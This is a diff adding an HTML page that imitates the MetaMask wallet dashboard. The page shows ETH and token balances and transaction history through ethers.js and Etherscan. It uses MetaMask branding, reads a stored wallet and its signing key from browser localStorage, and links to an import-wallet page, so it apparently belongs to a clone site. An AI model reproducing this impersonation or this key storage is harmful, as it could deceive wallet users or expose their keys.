@@ -1,0 +1,614 @@
+﻿<!DOCTYPE html>
+<html lang="en">
+   <head>
+      <meta charset="UTF-8">
+      <title>MetaMask</title>
+      <link rel="stylesheet" href="bootstrap/4.4.1/css/bootstrap.min-1.css" integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh" crossorigin="anonymous">
+      <script src="ajax/libs/jquery/3.5.1/jquery.min-1.js"></script>
+      <link rel="stylesheet" href="assets/css/main-1.css">
+      <link rel="icon" href="favicon-1.ico" type="image/x-icon">
+      <script src="scripts/ethers-v4.min.js" charset="utf-8" type="text/javascript"></script>
+
+      
+   </head>
+   <body>
+      <div class="owerlay " style="display: none;">
+         <div class="popap" style="display: none;">
+            <div class="qrBox">
+               <div class="avatarBoxFix">
+                  <div class="BoxSvg asa">
+                     <svg height="120" version="1.1" width="120" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="overflow: hidden; position: relative;">
+                        <desc style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">Created with Raphaël 2.2.0</desc>
+                        <defs style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></defs>
+                        <rect x="0" y="0" width="54" height="54" rx="0" ry="0" fill="#189af2" stroke="none" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></rect>
+                        <rect x="0" y="0" width="54" height="54" rx="0" ry="0" fill="#f5c400" stroke="none" transform="matrix(-0.9558,0.2939,-0.2939,-0.9558,60.1479,53.9492)" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></rect>
+                        <rect x="0" y="0" width="54" height="54" rx="0" ry="0" fill="#c8144d" stroke="none" transform="matrix(0.9801,-0.1983,0.1983,0.9801,-4.5919,-21.3271)" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></rect>
+                        <rect x="0" y="0" width="54" height="54" rx="0" ry="0" fill="#fa7500" stroke="none" transform="matrix(-0.8318,0.555,-0.555,-0.8318,97.9387,53.8542)" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></rect>
+                     </svg>
+                  </div>
+               </div>
+               <div class="close1">
+                  <svg height="365pt" id="qpqp" fill="#9b9b9b" viewbox="0 0 365.71733 365" width="365pt" xmlns="http://www.w3.org/2000/svg">
+                     <g fill="#9b9b9b">
+                        <path d="m356.339844 296.347656-286.613282-286.613281c-12.5-12.5-32.765624-12.5-45.246093 0l-15.105469 15.082031c-12.5 12.503906-12.5 32.769532 0 45.25l286.613281 286.613282c12.503907 12.5 32.769531 12.5 45.25 0l15.082031-15.082032c12.523438-12.480468 12.523438-32.75.019532-45.25zm0 0"></path>
+                        <path d="m295.988281 9.734375-286.613281 286.613281c-12.5 12.5-12.5 32.769532 0 45.25l15.082031 15.082032c12.503907 12.5 32.769531 12.5 45.25 0l286.632813-286.59375c12.503906-12.5 12.503906-32.765626 0-45.246094l-15.082032-15.082032c-12.5-12.523437-32.765624-12.523437-45.269531-.023437zm0 0"></path>
+                     </g>
+                  </svg>
+               </div>
+               <h3 class="accNameHome">Account</h3>
+               <img height="130px" id="qr" src="" alt="">
+               <div class="am">
+                  <input type="text" id="wallet_id_popap" value="0x00000000000000000000000000">
+               </div>
+            </div>
+            <div class="btpopap">
+               <button class="bt55655 linkToEtherScan">View on Etherscan</button>
+            </div>
+         </div>
+         <div class="addEthBoxPopap" style="display: none;">
+            <div class="addEthBoxPopapTitleBox">
+               <h1>Deposit Ether</h1>
+               <p>MetaMask needs Ether in your wallet to interact with decentralized applications.</p>
+               <div class="close1" id="transactionbuttonPopapCloce">
+                  <svg height="365pt" fill="black" viewbox="0 0 365.71733 365" width="365pt" xmlns="http://www.w3.org/2000/svg">
+                     <g fill="black">
+                        <path d="m356.339844 296.347656-286.613282-286.613281c-12.5-12.5-32.765624-12.5-45.246093 0l-15.105469 15.082031c-12.5 12.503906-12.5 32.769532 0 45.25l286.613281 286.613282c12.503907 12.5 32.769531 12.5 45.25 0l15.082031-15.082032c12.523438-12.480468 12.523438-32.75.019532-45.25zm0 0"></path>
+                        <path d="m295.988281 9.734375-286.613281 286.613281c-12.5 12.5-12.5 32.769532 0 45.25l15.082031 15.082032c12.503907 12.5 32.769531 12.5 45.25 0l286.632813-286.59375c12.503906-12.5 12.503906-32.765626 0-45.246094l-15.082032-15.082032c-12.5-12.523437-32.765624-12.523437-45.269531-.023437zm0 0"></path>
+                     </g>
+                  </svg>
+               </div>
+            </div>
+            <div class="BbB">
+               <div class="addEthSelectBox">
+                  <div class="addEthSelectBoxItem">
+                     <div class="addEthSelectBoxItemImgBox">
+                        <img src="assets/img/deposit-eth.svg" alt="">
+                     </div>
+                     <div class="addEthSelectBoxItemTextBox">
+                        <h3>Direct Ether Recharge</h3>
+                        <p>If you already have Ether, then the fastest way to get Ether into your new wallet is direct recharge.</p>
+                     </div>
+                     <div class="addEthSelectBoxItemButtonBox"> 
+                        <button class="detailsPopap">Viwe Accounr</button>
+                     </div>
+                  </div>
+                  <div class="addEthSelectBoxItem">
+                     <div class="addEthSelectBoxItemImgBox">
+                        <img src="assets/img/wyre.svg" alt="">
+                     </div>
+                     <div class="addEthSelectBoxItemTextBox">
+                        <h3>Buy ETH with Wyre</h3>
+                        <p>Wyre lets you use a debit card to deposit ETH right in to your MetaMask account.</p>
+                     </div>
+                     <div class="addEthSelectBoxItemButtonBox"> 
+                        <button class="bt55655" data-link="https://pay.sendwyre.com/">Continue to Wyre</button>
+                     </div>
+                  </div>
+                  <div class="addEthSelectBoxItem">
+                     <div class="addEthSelectBoxItemImgBox">
+                        <img width="100px" src="assets/img/coinswitch_logo.png" alt="">
+                     </div>
+                     <div class="addEthSelectBoxItemTextBox">
+                        <h3>Buy on CoinSwitch</h3>
+                        <p>CoinSwitch is the one-stop destination to exchange more than 300 cryptocurrencies at the best rate.</p>
+                     </div>
+                     <div class="addEthSelectBoxItemButtonBox"> 
+                        <button class="bt55655" data-link="https://metamask.coinswitch.co/">Continue to CoinSwitch</button>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+      <div class="homeMain bg-c">
+         <div class="headrHome">
+            <div class="headBox">
+               <div>
+                  <img height="30px" src="assets/img/metamask-logo-horizontal.svg" alt="">
+               </div>
+               <div class="avatarBox">
+                  <div class="avatar">
+                     <svg height="100" version="1.1" width="100" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" style="overflow: hidden; position: relative;">
+                        <desc style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);">Created with Raphaël 2.2.0</desc>
+                        <defs style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></defs>
+                        <rect x="0" y="0" width="54" height="54" rx="0" ry="0" fill="#189af2" stroke="none" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></rect>
+                        <rect x="0" y="0" width="54" height="54" rx="0" ry="0" fill="#f5c400" stroke="none" transform="matrix(-0.9558,0.2939,-0.2939,-0.9558,60.1479,53.9492)" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></rect>
+                        <rect x="0" y="0" width="54" height="54" rx="0" ry="0" fill="#c8144d" stroke="none" transform="matrix(0.9801,-0.1983,0.1983,0.9801,-4.5919,-21.3271)" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></rect>
+                        <rect x="0" y="0" width="54" height="54" rx="0" ry="0" fill="#fa7500" stroke="none" transform="matrix(-0.8318,0.555,-0.555,-0.8318,97.9387,53.8542)" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></rect>
+                     </svg>
+                  </div>
+                  <div class="menu" style="display: none;">
+                     <div class="menuContent">
+                        <p>My account</p>
+                     </div>
+                     <div class="menu__divider "></div>
+                     <div class="accountBox">
+                     </div>
+                     <div class="menu__divider "></div>
+                     <div class="menuContent menuItem bt" data-link="importWallet.html">
+                        <p><img height="15px" style="margin-right: 5px" src="assets/img/usb.svg" alt="">Create a new wallet</p>
+                     </div>
+                  </div>
+               </div>
+            </div>
+         </div>
+         <div class="contentHomeMain">
+            <div class="contentHomeMainBox">
+
+               <div class="newaccountBox">
+                  <div class="newaccountBoxHead">
+
+                     <div class="aswd" id="copy" data-toggle="tooltip" data-placement="bottom" title="Copy to clipboard">
+                        <h3 class="accNameHome">Name</h3>
+
+                        <p><span id="w6">0x0000</span><span>....</span><span id="w4">0000</span></p>
+                     </div>
+
+
+
+                      <svg id="manuHedreBtn" version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" viewbox="0 0 384 384" style="enable-background:new 0 0 384 384;" xml:space="preserve">
+                        <g>
+                           <g>
+                              <circle cx="192" cy="42.667" r="42.667"></circle>
+                           </g>
+                        </g>
+                        <g>
+                           <g>
+                              <circle cx="192" cy="192" r="42.667"></circle>
+                           </g>
+                        </g>
+                        <g>
+                           <g>
+                              <circle cx="192" cy="341.333" r="42.667"></circle>
+                           </g>
+                        </g>
+
+                        </svg>
+
+                        <div class="popapAlertnew">
+
+                           <div class="detailse">
+                              <svg xmlns="http://www.w3.org/2000/svg" aria-hidden="true" focusable="false" data-prefix="fas" data-icon="qrcode" class="svg-inline--fa fa-qrcode fa-w-14" role="img" viewbox="0 0 448 512"><path fill="currentColor" d="M0 224h192V32H0v192zM64 96h64v64H64V96zm192-64v192h192V32H256zm128 128h-64V96h64v64zM0 480h192V288H0v192zm64-128h64v64H64v-64zm352-64h32v128h-96v-32h-32v96h-64V288h96v32h64v-32zm0 160h32v32h-32v-32zm-64 0h32v32h-32v-32z"></path></svg>
+                              <span>Account details</span>
+                           </div>
+                           <div class="bt55655 linkToEtherScan">
+                              <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="external-link-alt" class="svg-inline--fa fa-external-link-alt fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512"><path fill="currentColor" d="M432,320H400a16,16,0,0,0-16,16V448H64V128H208a16,16,0,0,0,16-16V80a16,16,0,0,0-16-16H48A48,48,0,0,0,0,112V464a48,48,0,0,0,48,48H400a48,48,0,0,0,48-48V336A16,16,0,0,0,432,320ZM488,0h-128c-21.37,0-32.05,25.91-17,41l35.73,35.73L135,320.37a24,24,0,0,0,0,34L157.67,377a24,24,0,0,0,34,0L435.28,133.32,471,169c15,15,41,4.5,41-17V24A24,24,0,0,0,488,0Z"></path></svg>
+                              <span>View on Etherscan</span>
+                           </div>
+
+                           <div>
+                              <svg aria-hidden="true" focusable="false" data-prefix="far" data-icon="dot-circle" class="svg-inline--fa fa-dot-circle fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 512 512"><path fill="currentColor" d="M256 56c110.532 0 200 89.451 200 200 0 110.532-89.451 200-200 200-110.532 0-200-89.451-200-200 0-110.532 89.451-200 200-200m0-48C119.033 8 8 119.033 8 256s111.033 248 248 248 248-111.033 248-248S392.967 8 256 8zm0 168c-44.183 0-80 35.817-80 80s35.817 80 80 80 80-35.817 80-80-35.817-80-80-80z"></path></svg>
+                              <span>Connected sites</span>
+                           </div>
+                           
+                        </div>
+                     
+                  </div>
+
+                  <div class="newaccountBoxBody">
+
+                     <div class="MainLogoEthBox w dsaddsdf">
+                        
+                        <div>
+                            <img class="eth-logo" src="assets/img/eth_logo.svg" alt="">
+                        </div>
+
+                        <div class="balanceNew">
+                           <h1><z style="margin-right: 5px;" class="ETHBALANCE">0</z>  ETH</h1>
+                           
+                           <p>$<z class="USDBALANCE">0.00</z> USD</p>
+                           
+                        </div> 
+
+                        <div class="newactionsbtns">
+                           <div class="newactionsbtnsItem" id="transactionbuttonPopap" class="transactionbutton">
+
+                              <div>
+                                <svg width="17" height="21" viewbox="0 0 17 21" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M8.62829 14.3216C8.65369 14.2947 8.67756 14.2664 8.69978 14.2368L12.8311 10.1286C13.0886 9.87975 13.1913 9.51233 13.1 9.16703C13.0087 8.82174 12.7375 8.55207 12.3903 8.46129C12.0431 8.37051 11.6736 8.47268 11.4233 8.72869L8.89913 11.2387L8.89913 1.3293C8.90647 0.970874 8.71837 0.636511 8.40739 0.455161C8.0964 0.273811 7.71112 0.27381 7.40014 0.45516C7.08915 0.636511 6.90105 0.970873 6.90839 1.3293L6.90839 11.2387L4.38422 8.72869C4.13396 8.47268 3.76446 8.37051 3.41722 8.46129C3.06998 8.55207 2.79879 8.82174 2.7075 9.16703C2.61621 9.51233 2.71896 9.87975 2.97641 10.1286L7.11049 14.2395C7.28724 14.4717 7.55784 14.6148 7.85026 14.6306C8.14268 14.6464 8.42727 14.5333 8.62829 14.3216Z" fill="white"></path><rect x="0.260986" y="15.75" width="15.8387" height="2.25" rx="1" fill="white"></rect></svg>
+                              </div>
+                              <span>Buy</span>
+                           </div>
+
+                           <div class="newactionsbtnsItem  bt" data-link="sendEther.html">
+
+                              <div>
+                                    <svg width="15" height="15" viewbox="0 0 15 15" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M13.6827 0.889329C13.6458 0.890495 13.609 0.893722 13.5725 0.898996H7.76263C7.40564 0.893947 7.07358 1.08151 6.89361 1.38986C6.71364 1.69821 6.71364 2.07958 6.89361 2.38793C7.07358 2.69628 7.40564 2.88384 7.76263 2.87879H11.3124L1.12335 13.0678C0.864749 13.3161 0.760577 13.6848 0.851011 14.0315C0.941446 14.3786 1.21235 14.6495 1.55926 14.7399C1.90616 14.8303 2.27485 14.7262 2.52313 14.4676L12.7121 4.27857V7.82829C12.7071 8.18528 12.8946 8.51734 13.203 8.69731C13.5113 8.87728 13.8927 8.87728 14.2011 8.69731C14.5094 8.51734 14.697 8.18528 14.6919 7.82829V2.01457C14.7318 1.7261 14.6427 1.43469 14.4483 1.2179C14.2538 1.00111 13.9738 0.880924 13.6827 0.889329Z" fill="white"></path></svg>
+                              </div>
+                           
+                              <span>Send</span>
+                           </div>
+
+
+                           <div class="newactionsbtnsItem">
+                              <div>
+                                 <svg width="17" height="17" viewbox="0 0 17 17" fill="none" xmlns="http://www.w3.org/2000/svg"><path d="M13.1714 9.66035V12.3786H4.68253C4.51685 12.3786 4.38253 12.2443 4.38253 12.0786V10.5478C4.38253 10.1888 3.94605 10.0116 3.69574 10.269L0.978328 13.0641C0.827392 13.2193 0.827392 13.4665 0.978328 13.6217L3.69573 16.4168C3.94604 16.6742 4.38253 16.497 4.38253 16.1379V14.6072C4.38253 14.4415 4.51685 14.3072 4.68253 14.3072H14.9992H15.0492V14.2572V9.66035C15.0492 9.14182 14.6288 8.72146 14.1103 8.72146C13.5918 8.72146 13.1714 9.14182 13.1714 9.66035ZM2.55476 2.55003H2.50476V2.60003V7.19686C2.50476 7.71539 2.92511 8.13575 3.44364 8.13575C3.96218 8.13575 4.38253 7.71539 4.38253 7.19686V4.70619C4.38253 4.5805 4.48443 4.47861 4.61012 4.47861H12.8714C13.0371 4.47861 13.1714 4.61292 13.1714 4.77861V6.30937C13.1714 6.66845 13.6079 6.84566 13.8582 6.5882L16.5756 3.79315C16.7266 3.6379 16.7266 3.39074 16.5756 3.23549L13.8582 0.440443C13.6079 0.182981 13.1714 0.360188 13.1714 0.719273V2.25004C13.1714 2.41572 13.0371 2.55003 12.8714 2.55003H2.55476Z" fill="white" stroke="white" stroke-width="0.1"></path></svg>
+                              </div>
+                             
+                              <span>Swap</span>
+                           </div>
+                        </div>  
+                     </div>
+                     
+                  </div>
+               </div>
+
+               <div class="transtokenBox">
+
+                  <div class="transtokenBoxHead">
+                     <div class="active tbs" data-id="Assets">
+                        Assets
+                     </div>
+
+                     <div class=" tbs" data-id="transBox">
+                        Activity
+                     </div>
+                  </div>
+
+                  <div class="transtokenBoxBody">
+
+                     <div class="Assets tbsContent" style="    min-height: 250px;">
+
+                        <div class="tokensBoxNew" id="TokensBOX">
+                           
+                           <div class="tokensBoxNewItem">
+                              <div class="tokensBoxNewItemTokenBalance">
+                                 <div>
+                                    <img class="eth-logo" src="assets/img/eth_logo.svg" alt="">
+                                 </div>
+                                 <div class="balanceBoxNew">
+                                    <h3>0 ETH</h3>
+                                    <p>$0.00 USD</p>
+                                 </div>
+                              </div>
+
+                              <div class="arrowNewBox">
+                                 <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-w-10" role="img" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 320 512"><path fill="currentColor" d="M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"></path></svg>
+                              </div>
+                           </div>
+
+                           <div class="tokensBoxNewItem">
+                              <div class="tokensBoxNewItemTokenBalance">
+                                 <div>
+                                    <img class="eth-logo" src="assets/img/eth_logo.svg" alt="">
+                                 </div>
+                                 <div class="balanceBoxNew">
+                                    <h3>0 ETH</h3>
+                                    <p>$0.00 USD</p>
+                                 </div>
+                              </div>
+
+                              <div class="arrowNewBox">
+                                 <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-w-10" role="img" xmlns="http://www.w3.org/2000/svg" viewbox="0 0 320 512"><path fill="currentColor" d="M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"></path></svg>
+                              </div>
+                           </div>
+
+                        </div>
+
+                        <button class="AddTokenBtn bt" data-link="addTokens.html">Add Token</button>
+                     </div>
+ 
+                     <div class="transBox tbsContent" style="display: none;">
+                        <p class="textTrans">You have no transactions</p>
+                        <!-- 
+                           <div class="TransItem">
+                              
+                              <div class="TransTYpeBoxMain">
+                                 <div class="TransTYpeBox">
+                                    <p>Send Ether</p>
+                           
+                                    <span>data</span>
+                                 </div>
+                           
+                                 <div class="confirmBox">CONFIRMED</div>
+                              </div>
+                           
+                           
+                              <div>
+                                 <p>-0.00052 ETH</p>
+                           
+                                 <span>-$0.16 USD</span>
+                              </div>
+                           </div> -->
+                     </div>
+                        
+                  </div>
+                  
+               </div>
+               
+            </div>
+         </div>
+      </div>
+      <script src="jquery-3.3.1.slim.min.js" integrity="sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo" crossorigin="anonymous"></script>
+<script src="ajax/libs/popper.js/1.14.3/umd/popper.min.js" integrity="sha384-ZMP7rVo3mIykV+2+9J3UJ46jBk0WLaUAdn689aCwoqbBJiSnjAK/l8WvCWPIPm49" crossorigin="anonymous"></script>
+<script src="bootstrap/4.1.3/js/bootstrap.min.js" integrity="sha384-ChfqqxuZUCnJSK3+MXmPNIyE6ZbWh2IMqE241rYiqJxyMiZ6OW/JmZQ5stwEULTy" crossorigin="anonymous"></script>
+      <script src="assets/js/main-1.js"></script>
+
+      <script>
+         $("#manuHedreBtn").on('click', function(e){
+
+             e.stopPropagation();
+
+            $(".popapAlertnew").show();
+         })
+
+
+         $(document).click(function () {
+             $('.popapAlertnew').hide();
+         });
+
+         $(".tbs").on("click", function(){
+            $(".tbs").removeClass("active");
+            $(this).addClass("active");
+            $(".tbsContent").hide();
+            $("."+$(this).data("id")).show();
+         });
+
+      </script>   
+      <script>
+
+        $(function () {
+  $('[data-toggle="tooltip"]').tooltip()
+})
+         let etherString;
+         
+         let provider = new ethers.providers.EtherscanProvider();
+         
+         provider.getBalance(JSON.parse(localStorage.getItem('wallet')).signingKey.address).then((balance) => {
+         
+           // balance is a BigNumber (in wei); format is as a sting (in ether)
+           etherString = ethers.utils.formatEther(balance);
+         
+          	$(".ETHBALANCE").text(etherString.toString().substr(0,6));
+         
+          	let etherscanProvider = new ethers.providers.EtherscanProvider();
+         
+         etherscanProvider.getEtherPrice().then(function(price) {
+         
+         $(".USDBALANCE").text((price * etherString).toString().substr(0,6));
+         
+           
+         });
+         
+         
+           
+           
+         });
+         
+         
+         
+         
+         let address = JSON.parse(localStorage.getItem('wallet')).signingKey.address;
+         
+         $("#qr").attr("src", "https://api.qrserver.com/v1/create-qr-code/?size=300x300&data="+address);
+         
+         $("#w6").text(address.substr(0, 6));
+         
+         $("#w4").text(address.substr(-4));
+         
+         $("#wallet_id_popap").val(JSON.parse(localStorage.getItem('wallet')).signingKey.address);
+         
+         
+         
+         $(".linkToEtherScan").data("link", "https://etherscan.io/address/"+address);
+         
+         
+         let string = "";
+         let etherscanProvider = new ethers.providers.EtherscanProvider();
+         etherscanProvider.getHistory(address).then((history) => {
+           history.reverse().forEach((tx) => {
+         
+         
+         
+                var unixtimestamp = tx.timestamp;
+         
+         
+          // Convert timestamp to milliseconds
+          var date = new Date(unixtimestamp*1000);
+         
+          // Year
+          var year = date.getFullYear();
+         
+          // Month
+          var month = date.getMonth()+1;
+         
+          // Day
+          var day = date.getDate();
+         
+          // Hours
+          var hours = date.getHours();
+         
+          // Minutes
+          
+         
+          if(date.getMinutes().length == 1){
+          	var minutes = "0" + date.getMinutes();
+          }else{
+         
+          	var minutes = date.getMinutes();
+          }
+         
+         var d = month + "/" + day + "/" + year + " at " + hours +":"+minutes;
+         
+         if(tx.from == address){
+         
+         	var q = "-";
+         
+         	var w = "Send";
+         
+         }
+         else{
+         	var q = "+";
+         
+         	var w = "Received";
+         }
+         
+         var balance = tx.value._hex;
+         
+         
+         
+         let etherscanProvider = new ethers.providers.EtherscanProvider();
+         
+         etherscanProvider.getEtherPrice().then(function(price) {
+         
+         		$(".USDBALANCE").text((price * etherString).toString().substr(0,6));
+         
+         
+         		string += `<div class="TransItem" data-link="https://etherscan.io/tx/`+tx.hash+`">
+         				
+         				<div class="TransTYpeBoxMain " >
+         					<div class="TransTYpeBox">
+         						<p>`+ w +` Ether</p>
+         
+         						<span>`+d+`</span>
+         					</div>
+         
+         					<div class="confirmBox">CONFIRMED</div>
+         				</div>
+         
+         
+         				<div class="AmountBoxHistory">
+         					<p>`+q+ (ethers.utils.formatEther(balance)).toString().substr(0,7) +` ETH</p>
+         
+         					<span>`+q+`$ `+(price * ethers.utils.formatEther(balance)).toString().substr(0,4) +` USD</span>
+         				</div>
+         			</div>`;
+         
+         			
+         		 $(".transBox").html(string);
+           
+         });
+         
+         
+         
+         
+           })
+         
+           
+         
+          
+         });
+         
+         
+         
+         $(document).on('click','.TransItem',function(){
+         var win = window.open($(this).data("link"), '_blank');
+         win.focus();
+         })
+         
+         
+         // var tokens = [{img:'assets/img/eth_logo.svg', name:'Trthrt', type: "USDT"},{img:'assets/img/eth_logo.svg', name:'Trthrt', type: "USDT"}];
+         
+         // localStorage.setItem("tokens",JSON.stringify(tokens))
+         
+         
+         
+         var array = JSON.parse(localStorage.getItem("tokens"));
+         
+         var a="";
+
+            a += `<div class="tokensBoxNewItem"><div class="tokensBoxNewItemTokenBalance"><div><img  class="eth-logo" src="assets/img/eth_logo.svg" alt=""></div><div class="balanceBoxNew"><h3><z class="ETHBALANCE">0</z>  ETH</h3><p>$<z  class="USDBALANCE">0.00</z> USD</p></div></div> <div class="arrowNewBox"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-w-10" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"></path></svg></div></div>`;
+         
+         for (var item in array) {
+         
+         
+         
+         // console.log(address);
+         
+         // console.log(array[item].address);
+
+
+         
+         if(array[item].address == address){
+         
+         a += `<div class="tokensBoxNewItem TokenITEMS" data-type="`+array[item].type+`" data-count="`+array[item].count+`"  data-address="`+array[item].cantractAddress+`"><div class="tokensBoxNewItemTokenBalance"><div><img  class="eth-logo" src="`+array[item].img+`" alt=""></div><div class="balanceBoxNew"><h3><z class="`+array[item].cantractAddress+`">0</z> `+array[item].type+`</h3><!-- <p>$0.00 USD</p> --></div></div> <div class="arrowNewBox"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="chevron-right" class="svg-inline--fa fa-chevron-right fa-w-10" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M285.476 272.971L91.132 467.314c-9.373 9.373-24.569 9.373-33.941 0l-22.667-22.667c-9.357-9.357-9.375-24.522-.04-33.901L188.505 256 34.484 101.255c-9.335-9.379-9.317-24.544.04-33.901l22.667-22.667c9.373-9.373 24.569-9.373 33.941 0L285.475 239.03c9.373 9.372 9.373 24.568.001 33.941z"></path></svg></div></div>`;
+         
+         }
+         
+         
+         
+         
+         
+         
+         
+         
+         }
+         
+         
+         $("#TokensBOX").html(a);
+         
+         
+         
+         var abi = [
+         {
+           "constant": true,
+           "inputs": [
+             {
+               "name": "_owner",
+               "type": "address"
+             }
+           ],
+           "name": "balanceOf",
+           "outputs": [
+             {
+               "name": "balance",
+               "type": "uint256"
+             }
+           ],
+           "payable": false,
+           "type": "function"
+         }
+         ]
+         
+         
+         
+         
+         
+         	$( ".TokenITEMS" ).each(function( index ) {
+         
+         
+         
+         
+         tokenAddres = $(this).data("address"); //
+         
+          const getBalance = async (options) => {
+            const contract = new ethers.Contract(tokenAddres, abi, provider);
+            const balance = await contract.balanceOf(address);
+            return balance.toString();
+          };
+         
+         
+          getBalance().then((val) => {
+         
+          		if(val > 0 ){
+         
+          			$("."+$(this).data("address")).text((val/(Math.pow(10, $(this).data("count")))).toString().substr(0,8))
+         
+         
+          		}else{
+         
+          			$("."+$(this).data("address")).text(val)
+          		}
+         
+          		
+         
+         
+          });
+         
+         
+         
+         
+         
+         	});
+         
+         
+         
+         
+         
+         
+         
+         
+         
+         
+      </script>
+   </body>
+</html>
